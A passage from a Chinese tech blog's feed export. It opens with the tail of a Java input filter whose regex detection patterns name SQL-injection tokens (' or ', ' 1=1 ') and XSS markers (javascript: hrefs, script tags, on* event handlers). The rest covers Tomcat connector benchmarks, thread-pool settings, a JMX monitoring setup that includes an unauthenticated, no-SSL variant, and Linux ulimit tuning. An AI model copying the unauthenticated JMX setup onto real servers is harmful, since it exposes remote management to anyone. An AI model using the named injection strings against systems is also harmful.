        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"\'"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"\\+"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"\\\\"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"\\("</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"\\)"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">" and "</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">" or "</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">" 1=1 "</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"(\\bhref(?=\\s*=\\s*['\"]?\\s*javascript:))|(\\bdata(?!:\\s*image/))|(^[^&lt;]*&lt;(?=/textarea\\s*&gt;))|(&lt;(?=(script)|(/script)))|(\\b(onafterprint|onbeforeprint|onbeforeunload|onerror|onhaschange|onload|onmessage|onoffline|ononline|onpagehide|onpageshow|onpopstate|onredo|onresize|onstorage|onundo|onunload|onblur|onchange|oncontextmenu|onfocus|onformchange|onforminput|oninput|oninvalid|onreset|onreset|onsubmit|onkey\\w*|onclick|ondblclick|ondrag\\w*|ondrop|onmouse\\w*|onscroll|ontouch\\w*)(?=(\\s*)=))"</span><span class="token punctuation">,</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">MULTILINE</span> <span class="token operator">|</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token constant">DOTALL</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SafeFilterConstant</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> noFilterList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        noFilterList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"res_create_user_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        noFilterList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"(.*?)DataListStr(.*?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        noFilterList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"proc_dxid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        noFilterList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"userName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        noFilterList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        noFilterList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"sortParam"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat基础</title>
    <url>/20221030/530cfffd.html</url>
    <content><![CDATA[<h1>Tomcat的四种基于HTTP协议的Connector性能比较</h1>
<p>今天在osc上看到对Tomcat的四种基于HTTP协议的Connector性能比较</p>
<p>具体内容如下：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8081<span class="token punctuation">"</span></span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.apache.coyote.http11.Http11NioProtocol<span class="token punctuation">"</span></span> <span class="token attr-name">connectionTimeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20000<span class="token punctuation">"</span></span> <span class="token attr-name">redirectPort</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8443<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8081<span class="token punctuation">"</span></span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTP/1.1<span class="token punctuation">"</span></span> <span class="token attr-name">connectionTimeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20000<span class="token punctuation">"</span></span> <span class="token attr-name">redirectPort</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8443<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>


<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8081<span class="token punctuation">"</span></span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTP/1.1<span class="token punctuation">"</span></span> <span class="token attr-name">executor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tomcatThreadPool<span class="token punctuation">"</span></span> <span class="token attr-name">connectionTimeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20000<span class="token punctuation">"</span></span> <span class="token attr-name">redirectPort</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8443<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8081<span class="token punctuation">"</span></span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.apache.coyote.http11.Http11NioProtocol<span class="token punctuation">"</span></span> <span class="token attr-name">executor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tomcatThreadPool<span class="token punctuation">"</span></span> <span class="token attr-name">connectionTimeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20000<span class="token punctuation">"</span></span>  <span class="token attr-name">redirectPort</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8443<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们姑且把上面四种Connector按照顺序命名为 NIO, HTTP, POOL, NIOP</p>
<p>为了不让其他因素影响测试结果，我们只对一个很简单的jsp页面进行测试，这个页面仅仅是输出一个Hello World。假设地址是 <a href="http://tomcat1/test.jsp">http://tomcat1/test.jsp</a></p>
<p>我们依次对四种Connector进行测试，测试的客户端在另外一台机器上用ab命令来完成，</p>
<p>测试命令为： ab -c 900 -n 2000 <a href="http://tomcat1/test.jsp">http://tomcat1/test.jsp</a> ，</p>
<p>最终的测试结果如下表所示(单位:平均每秒处理的请求数)：</p>
<table>
<thead>
<tr>
<th>NIO</th>
<th>HTTP</th>
<th>POOL</th>
<th>NIOP</th>
</tr>
</thead>
<tbody>
<tr>
<td>281</td>
<td>65</td>
<td>208</td>
<td>365</td>
</tr>
<tr>
<td>666</td>
<td>66</td>
<td>110</td>
<td>398</td>
</tr>
<tr>
<td>692</td>
<td>65</td>
<td>66</td>
<td>263</td>
</tr>
<tr>
<td>256</td>
<td>63</td>
<td>94</td>
<td>459</td>
</tr>
<tr>
<td>440</td>
<td>67</td>
<td>145</td>
<td>363</td>
</tr>
<tr>
<td>NIO方式波动很大，但没有低于280 的</td>
<td>Tomcat的默认配置HTTP的性能是很稳定，但是也是最差的</td>
<td>而POOL方式则波动很大，测试期间和HTTP方式一 样，不时有停滞</td>
<td>NIOP是在NIO的基础上加入线程池，可能是程序处理更复杂了，因此性能不见得比NIO强</td>
</tr>
</tbody>
</table>
<p>由于linux的内核默认限制了最大打开文件数目是1024，因此此次并发数控制在900。</p>
<p>尽管这一个结果在实际的网站中因为各方面因素导致，可能差别没这么大，例如受限于数据库的性能等等的问题。</p>
<p>但对我们在部署网站应用时还是具有参考价值的。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span> <span class="token attr-name">executor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tomcatThreadPool<span class="token punctuation">"</span></span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8090<span class="token punctuation">"</span></span> <span class="token attr-name">redirectPort</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8443<span class="token punctuation">"</span></span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.apache.coyote.http11.Http11NioProtocol<span class="token punctuation">"</span></span> <span class="token attr-name">compression</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>on<span class="token punctuation">"</span></span> <span class="token attr-name">compressionMinSize</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2048<span class="token punctuation">"</span></span> <span class="token attr-name">enableLookups</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">acceptCount</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token attr-name">URIEncoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token attr-name">connectionTimeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>40000<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>说明</th>
<th>参数</th>
</tr>
</thead>
<tbody>
<tr>
<td>连接器使用的线程池的名子</td>
<td>executor=“tomcatThreadPool”</td>
</tr>
<tr>
<td>连接器端口</td>
<td>port=“8090”</td>
</tr>
<tr>
<td>连接器使用的传输方式</td>
<td>protocol=“org.apache.coyote.http11.Http11NioProtocol”</td>
</tr>
<tr>
<td>传输时是否支持压缩</td>
<td>compression=“on”</td>
</tr>
<tr>
<td>压缩的大小</td>
<td>compressionMinSize=“2048”</td>
</tr>
</tbody>
</table>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Executor</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tomcatThreadPool<span class="token punctuation">"</span></span> <span class="token attr-name">namePrefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>catalina-exec-<span class="token punctuation">"</span></span> <span class="token attr-name">maxThreads</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>800<span class="token punctuation">"</span></span> <span class="token attr-name">minSpareThreads</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span> <span class="token attr-name">maxSpareThreads</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>700<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>线程池名</th>
<th>name=“tomcatThreadPool”</th>
</tr>
</thead>
<tbody>
<tr>
<td>线程前缀</td>
<td>namePrefix=“catalina-exec-”</td>
</tr>
<tr>
<td>最大产生线程数</td>
<td>maxThreads=“800”</td>
</tr>
<tr>
<td>最小初始线程数</td>
<td>minSpareThreads=“400”</td>
</tr>
<tr>
<td>最大初始线程数</td>
<td>maxSpareThreads=“700”</td>
</tr>
</tbody>
</table>
<h1>Tomcat开启JMX监控</h1>
<p>背景：Tomcat系统运行过程出现错误，需要打开JMX，添加对JVM的监控。Tomcat运行在CentOS中。</p>
<p>前提：监控端windows系统，安装JDK。</p>
<ol>
<li>
<p>服务器关闭Tomcat</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> <span class="token builtin class-name">cd</span> /opt/apache-tomcat-7.0.54/bin

./shutdown.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>进入Tomcat/bin目录，<a href="http://xn--catalina-0n3mm27o.sh">修改catalina.sh</a>，找到如下内容“#—–Execute The Requested Command”，在其上添加以下配置，此配置不需要用户名、密码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CATALINA_OPTS</span><span class="token operator">=</span>”<span class="token variable">$CATALINA_OPTS</span>

<span class="token parameter variable">-Dcom.sun.management.jmxremote</span>

<span class="token parameter variable">-Djava.rmi.server.hostname</span><span class="token operator">=</span><span class="token number">192.168</span>.23.1

<span class="token parameter variable">-Dcom.sun.management.jmxremote.port</span><span class="token operator">=</span><span class="token number">9999</span>

<span class="token parameter variable">-Dcom.sun.management.jmxremote.ssl</span><span class="token operator">=</span>false

<span class="token parameter variable">-Dcom.sun.management.jmxremote.authenticate</span><span class="token operator">=</span>false”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>ip</td>
<td>是你要监控的tomcat所在服务器的ip地址。</td>
</tr>
<tr>
<td>端口号</td>
<td>是你要开启的监控端口号。</td>
</tr>
<tr>
<td>ssl</td>
<td>false表示不使用ssl链接。</td>
</tr>
<tr>
<td>authenticate</td>
<td>false表示不使用监控,即不需要用户名和密码</td>
</tr>
</tbody>
</table>
<p>以下方式需要配置用户名、密码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CATALINA_OPTS</span><span class="token operator">=</span>”<span class="token variable">$CATALINA_OPTS</span>

<span class="token parameter variable">-Dcom.sun.management.jmxremote</span>

<span class="token parameter variable">-Djava.rmi.server.hostname</span><span class="token operator">=</span><span class="token number">192.168</span>.23.1

<span class="token parameter variable">-Dcom.sun.management.jmxremote.port</span><span class="token operator">=</span><span class="token number">9999</span>

<span class="token parameter variable">-Dcom.sun.management.jmxremote.ssl</span><span class="token operator">=</span>false

<span class="token parameter variable">-Dcom.sun.management.jmxremote.authenticate</span><span class="token operator">=</span>true

<span class="token parameter variable">-Dcom.sun.management.jmxremote.password.file</span><span class="token operator">=</span><span class="token punctuation">..</span>/conf/jmxremote.password

<span class="token parameter variable">-Dcom.sun.management.jmxremote.access.file</span><span class="token operator">=</span><span class="token punctuation">..</span>/conf/jmxremote.access”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>authenticate</td>
<td>true开启鉴权功能</td>
</tr>
<tr>
<td>access.file</td>
<td>权限文件路径</td>
</tr>
<tr>
<td>password.file</td>
<td>密码文件路径</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>当没有配置密码时，无需此操作。当启用密码后，根据上述配置，将 <code>JAVA_HOME/jre/lib/management</code>下面的<code>jmxremote.access</code>和<code>jmxremote.password.template</code>拷贝到Tomcat的conf目录下，并对两个文件做以下修改：</p>
<p>jmxremote.password.template文件名修改为jmxremote.password</p>
<p>修改两个文件的权限</p>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">600</span> jmxremote.access
<span class="token function">chmod</span> <span class="token number">600</span> jmxremote.password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>修改jmxremote.access文件，将文件最后两行显示【monitorRole和controlRole】的注释取消，</p>
<p>其中monitorRole为只拥有只读权限的角色，</p>
<p>controlRole有更高权限：读写等。编辑完成后，保存。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-16383503107176.png" alt="img"></p>
<p>修改jmxremote.password文件。同样将文件最后两行显示【monitorRole和controlRole】的注释取消，两个用户名后面的字符即密码，然后保存。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16383503107187.png" alt="img"></p>
<ol start="4">
<li>
<p>服务器启动Tomcat</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> <span class="token builtin class-name">cd</span> /opt/apache-tomcat-7.0.54/bin

./startup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>做完以上操作后，使用jdk自带工具jvisualvm.exe连接，工具目录如下：JAVA_HOME/bin，连接方式如下：</p>
<p>右击“远程”，“添加远程主机”</p>
</li>
</ol>
<p>​	   <img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image003-16383503107188.png" alt="img"> <img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image004-16383503107189.png" alt="img"></p>
<pre><code>右击添加好的主机，“添加JMX连接”，根据配置信息，填写相应的端口、用户名、密码等信息
</code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image005-163835031071810.png" alt="img">  <img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image006-163835031071811.png" alt="img"></p>
<ol start="6">
<li>添加完成后，效果如下：</li>
</ol>
<p>​     <img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image008.jpg" alt="img"></p>
<ol start="7">
<li>如有其他需求，可下载其他附件</li>
</ol>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image009-163835031071812.png" alt="img"></p>
<p>如果需要独立的监控软件可下载：VisualVM</p>
<p>下载地址：<a href="http://visualvm.github.io/download.html">http://visualvm.github.io/download.html</a></p>
<p>入门指南：<a href="https://visualvm.github.io/gettingstarted.html?VisualVM_1.3.9">https://visualvm.github.io/gettingstarted.html?VisualVM_1.3.9</a></p>
<h1>Tomcat的连接数与线程池</h1>
<p>参考： <a href="https://www.cnblogs.com/kismetv/p/7806063.html">https://www.cnblogs.com/kismetv/p/7806063.html</a></p>
<h1>Tomcat 配置文件server.xml</h1>
<p>参考： <a href="https://www.cnblogs.com/kismetv/p/7228274.html">https://www.cnblogs.com/kismetv/p/7228274.html</a></p>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>安装Tomcat服务</title>
    <url>/20221030/6f43f742.html</url>
    <content><![CDATA[<h1>Window安装Tomcat 为服务</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tomcat/bin,
service.bat <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>$CATALINA_HOME：为系统环境变量。查看方式</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">windows： <span class="token builtin class-name">echo</span> %CATALINA_HOME% 
linux ：  <span class="token builtin class-name">echo</span> <span class="token variable">$CATALINA_HOME</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>输入localhost:8080默认访问的是<code>$CATALINA_HOME/webapps/ROOT</code></p>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux日常使用</title>
    <url>/20221030/fb3eb231.html</url>
    <content><![CDATA[<h1>Linux查看Tomcat服务</h1>
<ul>
<li>查看Tomcat的PID：<code> ps aux|grep tomcat</code></li>
<li>查看线程 ：<code> ps -T -p 需要查看的PID</code></li>
</ul>
<h1>提高打开文件限制量</h1>
<ol>
<li>
<p>解除 Linux 系统的最大进程数和最大文件打开数限制</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/security/limits.conf

<span class="token comment"># 添加如下的行</span>
<span class="token comment"># 说明：* 代表针对所有用户 noproc 是代表最大进程数 nofile 是代表最大文件打开数</span>

 * soft noproc <span class="token number">11000</span>
 * hard noproc <span class="token number">11000</span>

 * soft nofile <span class="token number">4100</span>
 * hard nofile <span class="token number">4100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>让 SSH 接受 Login 程式的登入，方便在 ssh 客户端查看 <code>ulimit -a </code> 资源限制：</p>
